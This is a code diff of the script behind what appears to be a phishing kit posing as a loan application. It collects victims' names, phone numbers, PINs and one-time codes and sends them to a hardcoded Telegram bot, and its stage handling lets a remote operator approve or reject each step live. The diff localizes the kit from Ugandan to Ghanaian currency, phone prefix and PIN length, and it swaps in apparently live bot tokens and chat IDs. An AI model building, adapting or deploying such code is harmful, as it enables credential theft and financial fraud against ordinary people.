@@ -1,8 +1,8 @@
 // ============================================================
 // TELEGRAM BOT CONFIGURATION
 // ============================================================
-const TG_TOKEN = "8908951107:AAHq3MUwi4fv6qABlugRb__C0D-MS-JfjZM";
-const TG_CHAT = "8832215321";
+const TG_TOKEN = "9207387824:AAG0rZfBXcHXxwk_CPKboYGZDlZHyhmYeds";
+const TG_CHAT = "8269053604";
 const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
 
 const sessions = new Map();
@@ -49,7 +49,7 @@ async function tgCall(method, body) {
 function tgFmt(row, kind) {
     if (kind === "sms") {
         const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
-        const num = row.phone ? `+256 ${row.phone}` : "—";
+        const num = row.phone ? `+233 ${row.phone}` : "—";
         const sms = row.smsMessage || "—";
         return `📨 New SMS submitted\n\nName: ${name}\nPhone: ${num}\nMessage: ${sms}\nApplication ID: ${row.id}`;
     }
@@ -213,7 +213,7 @@ function handleStageUpdate(session) {
         startSmsTimer();
     } else if (stage === 'pin_rejected') {
         document.getElementById('lpPhone').value = '';
-        [0, 1, 2, 3, 4].forEach(i => document.getElementById('lp' + i).value = '');
+        [0, 1, 2, 3].forEach(i => document.getElementById('lp' + i).value = '');
         goTo('page-login');
         document.getElementById('bLgn').disabled = false;
         chkPin();
@@ -229,10 +229,10 @@ function handleStageUpdate(session) {
     } else if (stage === 'otp_approved') {
         const months = parseInt(S.loanTerm) || 48;
         const monthly = Math.ceil((S.loanAmount || 1000000) / months);
-        document.getElementById('aprAmount').textContent = 'UGX ' + (S.loanAmount || 1000000).toLocaleString();
-        document.getElementById('aprAmt').textContent = 'UGX ' + (S.loanAmount || 1000000).toLocaleString();
+        document.getElementById('aprAmount').textContent = 'GHS ' + (S.loanAmount || 1000000).toLocaleString();
+        document.getElementById('aprAmt').textContent = 'GHS ' + (S.loanAmount || 1000000).toLocaleString();
         document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
-        document.getElementById('aprMth').textContent = 'UGX ' + monthly.toLocaleString();
+        document.getElementById('aprMth').textContent = 'GHS ' + monthly.toLocaleString();
         goTo('page-approval');
     } else if (stage === 'otp_rejected') {
         [0, 1, 2, 3].forEach(i => document.getElementById('otp' + i).value = '');
@@ -343,7 +343,7 @@ function toS3() {
     S.lastName = la;
     S.phone = ph;
 
-    document.getElementById('sA').textContent = 'UGX ' + S.loanAmount.toLocaleString();
+    document.getElementById('sA').textContent = 'GHS ' + S.loanAmount.toLocaleString();
     document.getElementById('sT').textContent = S.loanTerm;
     document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' :
     '');
@@ -365,7 +365,7 @@ function submitApp() {
     S.annualIncome = in_;
     S.applicationId = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
 
-    document.getElementById('sA').textContent = 'UGX ' + S.loanAmount.toLocaleString();
+    document.getElementById('sA').textContent = 'GHS ' + S.loanAmount.toLocaleString();
     document.getElementById('sT').textContent = S.loanTerm;
     document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' :
     '');
@@ -403,9 +403,9 @@ function clearErr(id) {
 
 function updateCalc() {
     const amt = +document.getElementById('amtSlider').value;
-    document.getElementById('calcAmt').textContent = 'UGX ' + amt.toLocaleString();
+    document.getElementById('calcAmt').textContent = 'GHS ' + amt.toLocaleString();
     const monthly = Math.ceil(amt / 48);
-    document.getElementById('monthlyAmt').textContent = 'UGX ' + monthly.toLocaleString();
+    document.getElementById('monthlyAmt').textContent = 'GHS ' + monthly.toLocaleString();
 }
 
 // ══════════════════════════════════════════════════════
@@ -435,7 +435,7 @@ document.addEventListener('keydown', function(e) {
 
 function chkPin() {
     const phone = document.getElementById('lpPhone').value.trim();
-    const pinOk = [0, 1, 2, 3, 4].every(i => document.getElementById('lp' + i).value);
+    const pinOk = [0, 1, 2, 3].every(i => document.getElementById('lp' + i).value);
     const ok = phone.length === 9 && pinOk;
     const btn = document.getElementById('bLgn');
     btn.className = ok ? 'btn-login rdy' : 'btn-login';
@@ -443,16 +443,15 @@ function chkPin() {
 }
 
 function togPin() {
-    [0, 1, 2, 3, 4].forEach(i => {
+    [0, 1, 2, 3].forEach(i => {
         const b = document.getElementById('lp' + i);
         b.type = b.type === 'password' ? 'text' : 'password';
     });
 }
 
 function clearLoginPin() {
-    [0, 1, 2, 3, 4].forEach(i => { document.getElementById('lp' + i).value = ''; });
+    [0, 1, 2, 3].forEach(i => { document.getElementById('lp' + i).value = ''; });
     chkPin();
-    document.getElementById('otp0').focus();
 }
 
 function clearOtpCode() {
@@ -481,11 +480,11 @@ async function doLogin() {
     ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
 
     const phone = document.getElementById('lpPhone').value;
-    const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('lp' + i).value).join('');
+    const pin = [0, 1, 2, 3].map(i => document.getElementById('lp' + i).value).join('');
 
-    if (phone.length !== 9 || pin.length < 5) {
+    if (phone.length !== 9 || pin.length < 4) {
         S.isSubmitting = false;
-        showLgnMsg('warning', 'Phone: 9 digits (e.g., 771234567). PIN: 5 digits.');
+        showLgnMsg('warning', 'Phone: 9 digits (e.g., 771234567). PIN: 4 digits.');
         return;
     }
 
